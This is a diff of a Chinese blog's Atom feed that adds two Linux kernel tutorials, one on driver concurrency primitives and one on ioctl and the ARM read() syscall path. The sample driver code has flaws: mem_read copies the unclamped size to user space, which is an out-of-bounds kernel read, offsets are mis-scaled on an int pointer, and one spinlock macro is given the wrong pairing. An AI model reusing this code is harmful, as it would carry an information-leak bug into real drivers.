@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoururl.com/"/>
-  <updated>2018-10-16T11:59:11.374Z</updated>
+  <updated>2018-10-16T18:40:21.578Z</updated>
   <id>http://yoururl.com/</id>
   
   <author>
@@ -15,6 +15,239 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux内核分析（七）</title>
+    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%83%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/17/Linux内核分析（七）/</id>
+    <published>2018-10-16T17:55:00.000Z</published>
+    <updated>2018-10-16T18:40:21.578Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>* 1.并发和竞态简介* 2.竞态解决办法* 3.为我们的虚拟设备增加并发控制</code></pre><h1 id="并发和竞态简介"><a href="#并发和竞态简介" class="headerlink" title="并发和竞态简介"></a>并发和竞态简介</h1><h2 id="并发与竞态概念"><a href="#并发与竞态概念" class="headerlink" title="并发与竞态概念"></a>并发与竞态概念</h2><h3 id="何为并发"><a href="#何为并发" class="headerlink" title="何为并发"></a>何为并发</h3><p>并发是指多个执行单元同时、并行被执行。</p><h3 id="何为竞态"><a href="#何为竞态" class="headerlink" title="何为竞态"></a>何为竞态</h3><p>并发的执行单元对共享资源（硬件资源和软件上的全局变量，静态变量等）的访问容易发生竞态。</p><h3 id="我们虚拟设备的缺陷"><a href="#我们虚拟设备的缺陷" class="headerlink" title="我们虚拟设备的缺陷"></a>我们虚拟设备的缺陷</h3><p>对于我们前期的虚拟设备驱动个，假设一个执行单元A对其写入300个字符‘a’，而另一个执行单元B对其写入300个字符‘b’，第三个执行单元读取所有字符。如果A、B被顺序执行那么C读出的则不会出错，但如果A、B并发执行，那结果则是我们不可料想的。</p><h2 id="竞态发生的情况"><a href="#竞态发生的情况" class="headerlink" title="竞态发生的情况"></a>竞态发生的情况</h2><ul><li>对称多处理器（SMP）的多个CPU：SMP是一种紧耦合、共享存储的系统模型，它的特点是多个CPU使用共同的系统总线，因此可以访问共同的外设和存储器。</li><li>单CPU内进程与抢占它的进程：2.6的内核支持抢占调度，一个进程在内核执行的时候可能被另一高优先级进程打断。</li><li>中断（硬中断、软中断、tasklet、低半部）与进程之间：中断可以打断正在执行的进程，处理中断的程序和被打断的进程间也可能发生竞态。<br><br><br><br></li></ul><h1 id="竞态的解决办法"><a href="#竞态的解决办法" class="headerlink" title="竞态的解决办法"></a>竞态的解决办法</h1><p>解决竞态问题的途径是保证对共享资源的互斥访问。访问共享资源的代码区域称为临界区，临界区要互斥机制保护。Linux设备驱动中常见的互斥机制有以下方式：中断屏蔽、原子操作、自旋锁和信号量等。<br>上面我们已经分析了竞态产生的原因、发生的情况以及解决办法，下面我们对常见的解决办法一一分析。</p><h2 id="中断屏蔽"><a href="#中断屏蔽" class="headerlink" title="中断屏蔽"></a>中断屏蔽</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在单CPU中避免竞态的一种简单方法是在进入临界区之前屏蔽系统的中断。由于linux的异步I/O、进程调度等很多内容都依靠中断，所以我们应该尽快的执行完临界区的代码，换句话就是临界区代码应该尽量少。</p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了下面具体方法<br>Local_irq_disable();  //屏蔽中断<br>Local_irq_enable();  //打开中断<br>Local_irq_save(flags);  //禁止中断并保存当前cpu的中断位信息 </p><h2 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>原子操作指在执行过程中不会被别的代码中断的操作。</p><h3 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了一系列的函数来实现内核中的原子操作，这些操作分为两类，一类是整型原子操作，另一类是位原子操作，其都依赖底层CPU的原子操作实现，所以这些函数与CPU架构有密切关系。</p><h4 id="整型原子操作"><a href="#整型原子操作" class="headerlink" title="整型原子操作"></a>整型原子操作</h4><ul><li>设置原子变量的值<br>atomic_t v = ATOMIC_INIT(0);  //定义原子变量v并初始化为0<br>void atomic_set(atomic_t *v, int i);  //设置原子变量值为i    </li><li>获取原子变量的值<br>atomic_read(atomic_t *v);  //返回原子变量v的值  </li><li>原子变量加、减操作<br>void atomic_add(int i, atomic_t <em>v);  //原子变量v增加i<br>void atomic_sub(int I, atomic_t </em>v);  //原子变量v减少i  </li><li>原子变量自增、自减<br>void atomic_inc(atomic_t <em>v);  //原子变量v自增1<br>void atomic_dec(atomic_t </em>v);  //原子变量v自减1   </li><li>操作并测试<br>int atomic_inc_and_test(atomic_t <em>v);<br>int atomic_dec_and_test(atomic_t </em>v);<br>int atomic_sub_and_test(int i,atomic_t <em>v);<br>/</em>上述三个函数对原子变量v自增、自减和减操作（没有加）后测试其是否为0，如果为0返回true，否则返回false*/  </li><li>操作并返回<br>int atomic_add_return(int i,atomic_t <em>v);<br>int atomic_sub_return(int i,atomic_t </em>v);<br>int atomic_inc_return(atomic_t <em>v);<br>int atomic_dec_return(atomic_t </em>v);<br>/<em>上述函数对原子变量v进行自增、自减、加、减操作，并返回新的值</em>/ </li></ul><h4 id="位原子操作"><a href="#位原子操作" class="headerlink" title="位原子操作"></a>位原子操作</h4><ul><li>设置位<br>void set_bit(nr,void *addr);  //设置addr地址的第nr位，即向该位写入1。 </li><li>清除位<br>void clear_bit(nr,void *addr);  //清除addr地址的第nr位，即向该位写入0。 </li><li>改变位<br>void change_bit(nr,void *addr);  //对addr地址的第nr取反 </li><li>测试位<br>int test_bit(nr,void *addr);  //返回addr地址的第nr位 </li><li>测试并操作位<br>int test_and_set_bit(nr,void <em>addr);<br>int test_and_clear_bit(nr,void </em>addr);<br>int test_and_change_bit(nr,void <em>addr);<br>/</em>上述函数等同于执行test_bit后，再执行xxx_bit函数*/ </li></ul><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><p>自旋锁是一种对临界资源进行互斥访问的手段。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>为获得自旋锁，在某CPU上运行的代码需先执行一个原子操作，该操作测试并设置某个内存变量，由于其为原子操作，所以在该操作完成之前其他执行单元不可能访问这个内存变量，如果测试结果表明已经空闲，则程序获得这个自旋锁并继续执行，如果测试结果表明该锁仍被占用，程序将在一个小的循环内重复这个“测试并设置”操作，即进行所谓的“自旋”，通俗的说就是在“原地打转”。        </p><h3 id="具体操作-2"><a href="#具体操作-2" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与自旋锁相关的操作主要有：</p><ul><li>定义自旋锁<br>spinlock_t lock; </li><li>初始自旋锁<br>spin_lock_init(lock);</li><li>获得自旋锁<br>spin_lock(lock);  //获得自旋锁<br>lockspin_trylock(lock);  //尝试获取lock如果不能获得锁，返回假值，不在原地打转。 </li><li>释放自旋锁<br>spin_unlock(lock);  //释放自旋锁<br>为保证我们执行临界区代码的时候不被中断等影响我们的自旋锁又衍生了下面的内容</li><li>自旋锁衍生<br>  spin_lock_irq() = spin_lock() + local_irq_disable()<br>  spin_unlock_irq() = spin_unlock() + local_irq_enable()<br>  spin_lock_irqsave() = spin_lock() + local_irq_save()<br>  spin_unlock_irqrestore() = spin_unlock() + local_irq_restore()<br>  spin_lock_bh() = spin_lock() + local_bh_disable()<br>  spin_unlock_bh() = spin_unlock() + local_bh_disable() </li></ul><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ul><li>自旋锁实质是忙等锁，因此在占用锁时间极短的情况下，使用锁才是合理的，反之则会影响系统性能。</li><li>自旋锁可能导致系统死锁。</li><li>自旋锁锁定期间不能调用可能引起进程调度的函数。</li></ul><h2 id="读写自旋锁"><a href="#读写自旋锁" class="headerlink" title="读写自旋锁"></a>读写自旋锁</h2><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><p>为解决自旋锁中不能允许多个单元并发读的操作，衍生出了读写自旋锁，其不允许写操作并发，但允许读操作并发。</p><h3 id="具体操作-3"><a href="#具体操作-3" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写自旋锁相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>rwlock_t my_rwlock = RW_LOCK_UNLOCKED;  //静态初始化rwlock_t   my_rwlock;<br>rwlock_init(&amp;my_rwlock);  //动态初始化   </li><li>读锁定<br>read_lock();<br>read_lock_irqsave();<br>read_lock_irq();read_lock_bh(); </li><li>读解锁<br>read_unlock();<br>read_unlock_irqrestore();<br>read_unlock_irq();read_unlock_bh(); </li><li>写锁定<br>write_lock();<br>write_lock_irqsave();<br>write_lock_irq();<br>write_lock_bh();<br>write_trylock(); </li><li>写解锁<br>  write_unlock();<br>write_unlock_irqrestore();<br>write_unlock_irq();<br>write_unlock_bh(); </li></ul><h2 id="顺序锁"><a href="#顺序锁" class="headerlink" title="顺序锁"></a>顺序锁</h2><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><p>顺序锁是对读写锁的一种优化，如果使用顺序锁，读执行单元在写执行单元对被顺序锁保护的共享资源进行写操作时仍然可以继续读，不必等待写执行单元的完成，写执行单元也不需等待读执行单元完成在进行写操作。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>顺序锁保护的共享资源不含有指针，因为在写执行单元可能使得指针失效，但读执行单元如果此时访问该指针，将导致oops。</p><h3 id="具体操作-4"><a href="#具体操作-4" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与顺序锁相关的操作主要有：</p><ul><li>写执行单元获得顺序锁<br>write_seqlock();<br>write_tryseqlock();<br>write_seqlock_irqsave();<br>write_seqlock_irq();<br>write_seqlock_bh(); </li><li>写执行单元释放顺序锁<br>write_sequnlock();<br>write_sequnlock_irqrestore();<br>write_sequnlock_irq();<br>write_sequnlock_bh(); </li><li>读执行单元开始<br>read_seqbegin();<br>read_seqbegin_irqsave();  //local_irq_save + read_seqbegin </li><li>读执行单元重读<br>read_seqretry ();<br>read_seqretry_irqrestore (); </li></ul><h2 id="RCU（读—拷贝—更新）"><a href="#RCU（读—拷贝—更新）" class="headerlink" title="RCU（读—拷贝—更新）"></a>RCU（读—拷贝—更新）</h2><h3 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h3><p>RCU可以看做是读写锁的高性能版本，相比读写锁，RCU的优点在于即允许多个读执行单元同时访问被保护数据，又允许多个读执行单元和多个写执行单元同时访问被保护的数据。</p><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>RCU不能代替读写锁。</p><h3 id="具体操作：linux内核中与RCU相关的操作主要有："><a href="#具体操作：linux内核中与RCU相关的操作主要有：" class="headerlink" title="具体操作：linux内核中与RCU相关的操作主要有："></a>具体操作：linux内核中与RCU相关的操作主要有：</h3><ul><li>读锁定<br>rcu_read_lock ();<br>rcu_read_lock_bh ();  </li><li>读解锁<br>rcu_read_unlock ();<br>rcu_read_unlock_bh (); </li><li>同步RCU<br>synchronize_rcu ();  //由RCU写执行单元调用<br>synchronize_sched();  //可以保证中断处理函数处理完毕，不能保证软中断处理结束</li><li>挂接回调<br>call_rcu ();<br>call_rcu_bh ();<br>有关RCU的操作还有很多，大家可以参考网络。</li></ul><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><h3 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h3><p>信号量用于保护临界区的常用方法与自旋锁类似，但不同的是当获取不到信号量时，进程不会原地打转而是进入休眠等待状态。</p><h3 id="具体操作-5"><a href="#具体操作-5" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与信号量相关的操作主要有：</p><ul><li>定义信号量<br>Struct semaphore sem; </li><li>初始化信号量<br>void sema_init(struct semaphore *sem, int val);  //初始化sem为val，当然还有系统定义的其他宏初始化，这里不列举 </li><li>获得信号量<br>void down(struct semaphore <em>sem);  //获得信号量sem，其会导致睡眠，并不能被信号打断<br>int down_interruptible(struct semaphore </em>sem);  //进入睡眠可以被信号打断<br>int down_trylock(struct semaphore *sem);  //不会睡眠 </li><li>释放信号量　　<br>void up(struct semaphore *sem);  //释放信号量，唤醒等待进程<br>注：当信号量被初始为0时，其可以用于同步。</li></ul><h2 id="Completion用于同步"><a href="#Completion用于同步" class="headerlink" title="Completion用于同步"></a>Completion用于同步</h2><h3 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h3><p>linux中的同步机制。</p><h3 id="具体操作-6"><a href="#具体操作-6" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与Completion相关的操作主要有：</p><ul><li>定义Completion<br>struct completion *my_completion; </li><li>初始化Completion<br>void init_completion(struct completion *x); </li><li>等待Completion<br>void wait_for_completion(struct completion *); </li><li>唤醒Completion　　<br>void complete(struct completion <em>);  //唤醒一个 　　<br>void complete_all(struct completion </em>);  //唤醒该Completion的所有执行单元 </li></ul><h2 id="读写信号量"><a href="#读写信号量" class="headerlink" title="读写信号量"></a>读写信号量</h2><h3 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h3><p>与自旋锁和读写自旋锁的关系类似</p><h3 id="具体操作-7"><a href="#具体操作-7" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写信号量相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>struct rw_semaphore sem;<br>init_rwsem(&amp;sem); </li><li>读信号量获取<br>down_read ();<br>down_read_trylock(); </li><li>读信号量释放<br>up_read (); </li><li>写信号量获取<br>down_write ();<br>down_write_trylock ();</li><li>写信号量释放<br>up_write(); </li></ul><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h3 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h3><p>用来实现互斥操作</p><h3 id="具体操作-8"><a href="#具体操作-8" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与互斥体相关的操作主要有：</p><ul><li>定义和初始化互斥体<br>struct mutex lock;mutex_init(&amp;lock); </li><li>获取互斥体<br>void mutex_lock(struct mutex <em>lock);<br>int mutex_lock_interruptible(struct mutex </em>lock);<br>int mutex_lock_killable(struct mutex *lock); </li><li>释放互斥体<br>void mutex_unlock(struct mutex *lock);  </li></ul><p>上面我们介绍了linux内核中为了解决竞态所提供的方法，我们下面使用信号量为我们的虚拟设备增加并发控制。<br><br><br><br></p><h1 id="为我们的虚拟设备增加并发控制"><a href="#为我们的虚拟设备增加并发控制" class="headerlink" title="为我们的虚拟设备增加并发控制"></a>为我们的虚拟设备增加并发控制</h1><p>我们增加了并发控制后的代码如下，详细代码参考https:  //github.com/wrjvszq/myblongs  </p><pre><code>struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];  //全局内存4k    dev_t devno;    struct semaphore sem;  //并发控制所使用的信号量};static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.并发和竞态简介
+* 2.竞态解决办法
+* 3.为我们的虚拟设备增加并发控制
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;并发和竞态简介&quot;&gt;&lt;a href=&quot;#并发和竞态简介&quot; class=&quot;headerlink&quot; title=&quot;并发和竞态简介&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（六）</title>
+    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%85%AD%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/17/Linux内核分析（六）/</id>
+    <published>2018-10-16T17:39:00.000Z</published>
+    <updated>2018-10-16T17:53:32.591Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>* 1.字符设备控制方法实现* 2.揭秘系统调用本质</code></pre><h1 id="字符设备控制方法实现"><a href="#字符设备控制方法实现" class="headerlink" title="字符设备控制方法实现"></a>字符设备控制方法实现</h1><h2 id="设备控制简介"><a href="#设备控制简介" class="headerlink" title="设备控制简介"></a>设备控制简介</h2><ul><li>何为设备控制：我们所接触的大部分设备，除了读、写、打开关闭等方法外，还应该具有控制方法，比如：控制电机转速、串口配置波特率等。这就是对设备的控制方法。</li><li>用户如何进行设备控制：类似与我们在用户空间使用read、open等函数对设备进行操作，我们在用户空间对设备控制的函数是ioctl其原型为 int ioctl(int fd, int cmd, …)//fd为要控制的设备文件的描述符，cmd是控制命令，…依据第二个参数类似与我们的printf等多参函数。 </li><li>Ioctl调用驱动那个函数：在我们的用户层进行ioctl调用的时候驱动会根据内核版本不同调用不同的函数：<br>2.6.36以前的内核版本会调用 long (<em>ioctl) (struct inode</em>,struct file <em>, unsigned int, unsigned long);<br>2.6.36以后的内核会调用 long (</em>unlocked_ioctl) (struct file *, unsigned int, unsigned long); </li></ul><h2 id="Ioctl实现"><a href="#Ioctl实现" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h2><h3 id="控制命令解析"><a href="#控制命令解析" class="headerlink" title="控制命令解析"></a>控制命令解析</h3><p>我们刚才说到ioctl进行控制的时候有个cmd参数其为int类型的也就是32位，我们的linux为了让这32位更加有意义，所表示的内容更多，所以将其分为了下面几个段  </p><ul><li>Type（类型/幻数8bit）：表明这是属于哪个设备的命令  </li><li>Number（序号8bit）：用来区分统一设备的不同命令  </li><li>Direction（2bit）：参数传递方向，可能的取值，_IOC_NODE（没有数据传输）、_IOC_READ（从设备读）、_IOC_WRITE（向设备写）  </li><li>Size（13/14bit()）：参数长度  </li></ul><h3 id="定义命令"><a href="#定义命令" class="headerlink" title="定义命令"></a>定义命令</h3><p>我们的控制命令如此复杂，为了方便我们的linux系统提供了固定的宏来解决命令的定义，具体如下：  </p><ul><li>_IO(type,nr); ：定义不带参数的命令</li><li>_IOR(type,nr,datatype); ：从设备读参数命令</li><li>_IOW(type,nr,datatype); ：向设备写入参数命令  </li></ul><p>下面定义一个向设备写入参数的命令例子  </p><p>#define MEM_CLEAR _IOW(‘m’,0,int)//通常用一个字母来表示命令的类型  </p><h3 id="Ioctl实现-1"><a href="#Ioctl实现-1" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h3><p>下面我们去向我们上次实现的字符设备中添加ioctl方法，并实现设备重启命令（虚拟重启），对于不支持的命令我们返回-EINVAL代码如下:</p><pre><code>long mem_ioctl(struct file *fd, unsigned int cmd, unsigned long arg){    switch(cmd){        case MEM_RESTART:        printk(&quot;&lt;0&gt; memdev is restart&quot;);        break;        default:        return -EINVAL;    }    return 0;}</code></pre><p><br><br><br></p><h1 id="揭秘系统调用本质"><a href="#揭秘系统调用本质" class="headerlink" title="揭秘系统调用本质"></a>揭秘系统调用本质</h1><p>由于我自己的PC的调用过程不太熟悉，下面以arm的调用过程分析一下我们用户层调用read之后发生了什么，是怎么调用到我们驱动写的read函数的呢，我们下面进行深入剖析。  </p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们首先使用得到arm上可执行的应用程序 arm-linux-gcc -g -static read_mem.c -o read_mem<br>然后使用arm-linux-objdump -D -S read_mem &gt;dump 得到汇编文件，我们找到main函数的汇编实现</p><pre><code>int main(void){    8228: e92d4800 push {fp, lr}    822c: e28db004 add fp, sp, #4 ; 0x4    8230: e24dd008 sub sp, sp, #8 ; 0x8    int fd = 0;    8234: e3a03000 mov r3, #0 ; 0x0    8238: e50b3008 str r3, [fp, #-8]    int test = 0;    823c: e3a03000 mov r3, #0 ; 0x0    8240: e50b300c str r3, [fp, #-12]    fd = open(&quot;/dev/memdev0&quot;,O_RDWR);    8244: e59f004c ldr r0, [pc, #76] ; 8298 &lt;main+0x70&gt;    8248: e3a01002 mov r1, #2 ; 0x2    824c: eb0028a3 bl 124e0 &lt;__libc_open&gt;    8250: e1a03000 mov r3, r0    8254: e50b3008 str r3, [fp, #-8]    read(fd,&amp;test,sizeof(int));    8258: e24b300c sub r3, fp, #12 ; 0xc    825c: e51b0008 ldr r0, [fp, #-8]    8260: e1a01003 mov r1, r3    8264: e3a02004 mov r2, #4 ; 0x4    8268: eb0028e4 bl 12600 &lt;__libc_read&gt;//我们的read函数最终调用了__libc_read    printf(&quot;the test is %d\n&quot;,test);    826c: e51b300c ldr r3, [fp, #-12]    8270: e59f0024 ldr r0, [pc, #36] ; 829c &lt;main+0x74&gt;    8274: e1a01003 mov r1, r3    8278: eb000364 bl 9010 &lt;_IO_printf&gt;    close(fd);    827c: e51b0008 ldr r0, [fp, #-8]    8280: eb0028ba bl 12570 &lt;__libc_close&gt;    return 0;    8284: e3a03000 mov r3, #0 ; 0x0}</code></pre><p>在上面代码中大部分汇编指令都知道用法，但是svc调用引起注意，通过查阅资料才发现，我们应用程序通过svc 0x00000000可以产生异常，进入内核空间。<br>然后呢，系统处理异常，这中间牵扯好多代码还有中断的一些知识，我们找时间在专门分析，总之经过一大堆的处理最后它会跳到entry-common.S中的下面代码：  </p><pre><code>.align    5ENTRY(vector_swi)    sub    sp, sp, #S_FRAME_SIZE    stmia    sp, {r0 - r12}            @ Calling r0 - r12ARM(    add    r8, sp, #S_PC        )ARM(    stmdb    r8, {sp, lr}^        )    @ Calling sp, lrTHUMB(    mov    r8, sp            )THUMB(    store_user_sp_lr r8, r10, S_SP    )    @ calling sp, lr    mrs    r8, spsr            @ called from non-FIQ mode, so ok.    str    lr, [sp, #S_PC]            @ Save calling PC    str    r8, [sp, #S_PSR]        @ Save CPSR    str    r0, [sp, #S_OLD_R0]        @ Save OLD_R0    zero_fp    /*     * Get the system call number.     */#if defined(CONFIG_OABI_COMPAT)    /*     * If we have CONFIG_OABI_COMPAT then we need to look at the swi     * value to determine if it is an EABI or an old ABI call.     */#ifdef CONFIG_ARM_THUMB    tst    r8, #PSR_T_BIT    movne    r10, #0                @ no thumb OABI emulation    ldreq    r10, [lr, #-4]            @ get SWI instruction#else    ldr    r10, [lr, #-4]            @ get SWI instruction  A710(    and    ip, r10, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_CPU_ENDIAN_BE8    rev    r10, r10            @ little endian instruction#endif#elif defined(CONFIG_AEABI)    /*     * Pure EABI user space always put syscall number into scno (r7).     */  A710(    ldr    ip, [lr, #-4]            @ get SWI instruction    )  A710(    and    ip, ip, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#elif defined(CONFIG_ARM_THUMB)    /* Legacy ABI only, possibly thumb mode. */    tst    r8, #PSR_T_BIT            @ this is SPSR from save_user_regs    addne    scno, r7, #__NR_SYSCALL_BASE    @ put OS number in    ldreq    scno, [lr, #-4]#else    /* Legacy ABI only. */    ldr    scno, [lr, #-4]            @ get SWI instruction  A710(    and    ip, scno, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_ALIGNMENT_TRAP    ldr    ip, __cr_alignment    ldr    ip, [ip]    mcr    p15, 0, ip, c1, c0        @ update control register#endif    enable_irq    get_thread_info tsk    adr    tbl, sys_call_table        @ load syscall table pointer</code></pre><p>该段代码中我们先会获取系统调用的标号刚才让大家记住的3，然后呢会去查找sys_call_table我们找到</p><pre><code>.type    sys_call_table, #objectENTRY(sys_call_table)#include &quot;calls.S&quot;#undef ABI#undef OBSOLETE</code></pre><p>在calls.S中我们找到了下面东西（列出部分）</p><pre><code>*//* 0 */        CALL(sys_restart_syscall)        CALL(sys_exit)        CALL(sys_fork_wrapper)        CALL(sys_read)        CALL(sys_write)/* 5 */        CALL(sys_open)        CALL(sys_close)        CALL(sys_ni_syscall)        /* was sys_waitpid */        CALL(sys_creat)        CALL(sys_link)</code></pre><p>我们发现我们刚才记住的数字3刚好对应的是sys_read，在read_write.c中我们可以找到sys_read函数</p><pre><code>SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count){    struct file *file;    ssize_t ret = -EBADF;    int fput_needed;    file = fget_light(fd, &amp;fput_needed);    if (file) {        loff_t pos = file_pos_read(file);        ret = vfs_read(file, buf, count, &amp;pos);//调用虚拟文件系统的read        file_pos_write(file, pos);        fput_light(file, fput_needed);    }    return ret;}</code></pre><p>关于SYSCALL_DEFINE3这个宏的解析大家可以去<a href="http://blog.csdn.net/p_panyuch/article/details/5648007" target="_blank" rel="noopener">http://blog.csdn.net/p_panyuch/article/details/5648007</a> 这篇文章查看，在此我就不分析了，我们继续找到vfs_read代码如下：</p><pre><code>  ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos){    ssize_t ret;    if (!(file-&gt;f_mode &amp; FMODE_READ))        return -EBADF;    if (!file-&gt;f_op || (!file-&gt;f_op-&gt;read &amp;&amp; !file-&gt;f_op-&gt;aio_read))        return -EINVAL;    if (unlikely(!access_ok(VERIFY_WRITE, buf, count)))        return -EFAULT;    ret = rw_verify_area(READ, file, pos, count);    if (ret &gt;= 0) {        count = ret;        if (file-&gt;f_op-&gt;read)//我们的文件读函数指针不为空            ret = file-&gt;f_op-&gt;read(file, buf, count, pos);//执行我们驱动中的读函数        else            ret = do_sync_read(file, buf, count, pos);        if (ret &gt; 0) {            fsnotify_access(file);            add_rchar(current, ret);        }        inc_syscr(current);    }    return ret;}</code></pre><h2 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h2><p>通过上面的分析我们已经了解的read函数的调用基本过程，下面我们将read函数的调用过程在进行总结：</p><ul><li>寻找svc异常总体入口，并进入内核空间</li><li>取出系统调用的标号</li><li>根据系统调用标号，在sys_call_table中找到对应的系统调用函数</li><li>根据系统函数比如sys_read找到对应的虚拟文件系统的read            </li><li>虚拟文件系统在调用驱动的read。<br><br><br><br></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.字符设备控制方法实现
+* 2.揭秘系统调用本质
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;字符设备控制方法实现&quot;&gt;&lt;a href=&quot;#字符设备控制方法实现&quot; class=&quot;headerlink&quot; title=&quot;字符设备控制方法实现&quot;&gt;&lt;/a&gt;字符设备
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核分析" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（五）</title>
+    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/17/Linux内核分析（五）/</id>
+    <published>2018-10-16T16:23:00.000Z</published>
+    <updated>2018-10-16T18:37:25.036Z</updated>
+    
